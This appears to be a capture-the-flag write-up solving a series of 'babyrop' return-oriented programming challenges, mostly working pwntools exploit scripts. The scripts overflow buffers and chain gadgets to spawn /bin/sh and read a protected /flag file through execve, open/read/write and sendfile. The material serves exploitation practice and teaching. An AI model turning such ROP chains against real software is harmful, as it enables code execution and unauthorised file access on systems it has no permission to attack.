# Return Oriented Programming

## level 1.0

Straightforward; offset and address are given in debug output

```shell
python3 -c 'import sys; sys.stdout.buffer.write(b"a"*56 + b"\xe0\x1d\x40")' | /challenge/babyrop_level1.0
```

## level 1.1

GDB -> `disas challenge` -> `0x0000000000401e48 <+29>:    lea    rax,[rbp-0x70]` -> buffer starts at **rbp-0x70** and return address stored at **rbp+8**

```shell
python3 -c 'import sys; sys.stdout.buffer.write(b"a"*0x78 + b"\x2e\x1d\x40")' | /challenge/babyrop_level1.1
```

## level 2.0

offset given in debug output; GDB -> `info functions` ->

- `win_stage_1()` at **0x402108**
- `win_stage_2()` at **0x4021b5**

```shell
python3 -c 'import sys; sys.stdout.buffer.write(b"a"*0x78 + b"\x08\x21\x40"+b"\x00"*5+b"\xb5\x21\x40")' | /challenge/babyrop_level2.0
```

## level 2.1

GDB ->

- buffer starts at **rbp-0x50**
- `win_stage_1()` at **0x4012c4**
- `win_stage_2()` at **0x401371**

```shell
python3 -c 'import sys; sys.stdout.buffer.write(b"a"*0x58 + b"\xc4\x12\x40"+b"\x00"*5+b"\x71\x13\x40")' | /challenge/babyrop_level2.1
```

## level 3.0

offset given in debug output \
Get addresses of functions and `pop rdi; ret` gadget:

```shell
objdump -t /challenge/babyrop_level3.0 | grep ' F '
ROPgadget --binary /challenge/babyrop_level3.0 | grep "pop rdi ; ret"`
```

```python
from pwn import *
import sys

offset = 104
win_stages = [0x40203f,0x401f5f,0x4022e4,0x4021fe,0x40211b]
gadget = 0x4026d3

payload = b"a"*offset
for i in range(5):
    payload += p64(gadget)
    payload += p64(i+1)
    payload += p64(win_stages[i])

sys.stdout.buffer.write(payload)
```

```shell
python run.py | /challenge/babyrop_level3.0 
```

## level 3.1

- GDB -> find offset and function addresses
- ROPgadget -> find gadget address

Now, proceed same as prev

## level 4.0

- Got starting address of buffer from the stack leak output
- `checksec /challenge/babyrop_level4.0` -> NX is enabled (stack is non-executable), so shellcode injection won't work
- GDB -> find offset
- ROPgadget -> find gadgets to construct ROP chain

### Spawning a shell

```python
from pwn import *

p = process('/challenge/babyrop_level4.0')
p.recvuntil(b'[LEAK]')
addr = int(str(p.recvline().split(b" ")[-1])[2:-4], 16)

offset = 0x38
pop_rdi = 0x401e07 # pop rdi; ret
pop_rsi = 0x401e17 # pop rsi; ret
pop_rdx = 0x401de8 # pop rdx; ret
pop_rax = 0x401df7 # pop rax; ret
syscall = 0x401ddf
binsh = addr + offset + 72

payload = b'A'*offset
payload += p64(pop_rdi) + p64(binsh) # 1st arg: address of "/bin/sh"
payload += p64(pop_rsi) + p64(0) # 2nd arg: NULL
payload += p64(pop_rdx) + p64(0) # 3rd arg: NULL
payload += p64(pop_rax) + p64(59) # syscall number for execve
payload += p64(syscall) # execve("/bin/sh", NULL, NULL)
payload += b"/bin/sh\x00"

p.sendline(payload)
p.interactive()
```

Shell was spawned successfully, but `cat /flag` gave Permission denied error

### Executing open(), read(), write() worked

```python
from pwn import *

p = process('/challenge/babyrop_level4.0')
p.recvuntil(b'[LEAK]')
addr = int(str(p.recvline().split(b" ")[-1])[2:-4], 16)

offset = 0x38
pop_rdi = 0x401e07 # pop rdi; ret
pop_rsi = 0x401e17 # pop rsi; ret
pop_rdx = 0x401de8 # pop rdx; ret
pop_rax = 0x401df7 # pop rax; ret
syscall = 0x401ddf # syscall

flag_path = addr + offset + 8*25
buffer = flag_path + 10
size = 100

payload = b'A'*offset

payload += p64(pop_rdi) + p64(flag_path)  # 1st arg: pointer to "/flag"
payload += p64(pop_rsi) + p64(0)  # 2nd arg: O_RDONLY
payload += p64(pop_rax) + p64(2)  # 3rd arg: syscall number for open
payload += p64(syscall)  # open("/flag", O_RDONLY)

payload += p64(pop_rdi) + p64(3)  # 1st arg: file descriptor returned by open (stdout is 1, fd is 3 here)
payload += p64(pop_rsi) + p64(buffer)  # 2nd arg: buffer to store content of "/flag"
payload += p64(pop_rdx) + p64(size)  # 3rd arg: number of bytes to read
payload += p64(pop_rax) + p64(0)  # syscall number for read
payload += p64(syscall)  # read(3, buffer, size)

payload += p64(pop_rdi) + p64(1)  # 1st arg: file descriptor for stdout
payload += p64(pop_rsi) + p64(buffer)  # 2nd arg: buffer having content of "/flag"
payload += p64(pop_rdx) + p64(size)  # 3rd arg: size to write
payload += p64(pop_rax) + p64(1)  # syscall number for write
payload += p64(syscall)  # write(1, buffer, size)

payload += b"/flag\x00"
p.sendline(payload)
p.interactive()
```

## level 4.1

Prev solution works

## level 5.0

Here, we don't get a stack leak; so try to find a helpful string in the binary itself:

```shell
strings -t x /challenge/babyrop_level5.0
```

No luck there. But.. we can *insert* a string in the **.bss** section!

- `objdump -s -j .bss /challenge/babyrop_level5.0` -> get address of .bss section
- ROPgadget -> get addresses of gadgets
- GDB -> get offset

```python
from pwn import *

p = process('/challenge/babyrop_level5.0')

offset = 0x48
pop_rdi = 0x401dc8 # pop rdi; ret
pop_rsi = 0x401dd0 # pop rsi; ret
pop_rdx = 0x401dc0 # pop rdx; ret
pop_rax = 0x401da0 # pop rax; ret
syscall = 0x401db0
bssaddr = 0x405090

flag_path = b'/flag\x00'
buffer = bssaddr + len(flag_path) + 1
size = 75

payload = b'A'*offset

# read(0, bssaddr, len(flag_path))
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bssaddr)
payload += p64(pop_rdx) + p64(len(flag_path))
payload += p64(pop_rax) + p64(0)
payload += p64(syscall)

# open("/flag", O_RDONLY)
payload += p64(pop_rdi) + p64(bssaddr)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rax) + p64(2)
payload += p64(syscall)

# read(3, buffer, size)
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(buffer)
payload += p64(pop_rdx) + p64(size)
payload += p64(pop_rax) + p64(0)
payload += p64(syscall)  

# write(1, buffer, size)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(buffer)
payload += p64(pop_rdx) + p64(size)
payload += p64(pop_rax) + p64(1)
payload += p64(syscall)

p.sendline(payload)
p.sendline(flag_path)
p.interactive()
```

## level 5.1

Prev solution works

## level 6.0

Now, we don't have a `syscall` gadget

- `checksec /challenge/babyrop_level6.0` -> RELRO: Partial -> PLT exists
- `objdump -d /challenge/babyrop_level6.0 | grep "@plt"` -> get addresses of PLT functions
- `objdump -s -j .bss /challenge/babyrop_level6.0` -> get address of .bss section
- `ROPgadget --binary /challenge/babyrop_level6.0` -> get addresses of gadgets
- GDB -> get offset

```python
from pwn import *

p = process('/challenge/babyrop_level6.0')

offset = 0x68
pop_rdi = 0x401b98  # pop rdi; ret
pop_rsi = 0x401b90  # pop rsi; ret
pop_rdx = 0x401ba0  # pop rdx; ret
pop_rcx = 0x401b88  # pop rcx; ret
read_plt = 0x401160
open_plt = 0x4011d0
sendfile_plt = 0x4011a0
bssaddr = 0x4040a0

flag_path = b'/flag\x00'
size = 64 

payload = b'A' * offset

# read(stdin, bssaddr, len(flag_path))
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bssaddr)
payload += p64(pop_rdx) + p64(len(flag_path))
payload += p64(read_plt)

# open("/flag", O_RDONLY)
payload += p64(pop_rdi) + p64(bssaddr)
payload += p64(pop_rsi) + p64(0)
payload += p64(open_plt)

# sendfile(stdout, fd, 0, size)
payload += p64(pop_rdi) + p64(1)           
payload += p64(pop_rsi) + p64(3)           
payload += p64(pop_rdx) + p64(0)           
payload += p64(pop_rcx) + p64(size)        
payload += p64(sendfile_plt)               

p.sendline(payload)
p.sendline(flag_path)
p.interactive()
```

## level 6.1

Prev solution works

## Summary

1. **Control Hijack** to a function
2. **Chaining** functions
3. Chaining functions **with arguments**
4. Chaining ROP gadgets to make **syscalls**; known buffer address
5. 4 but buffer address not known; using **.bss section**
6. 5 but syscall gadget not present; using **PLT functions**
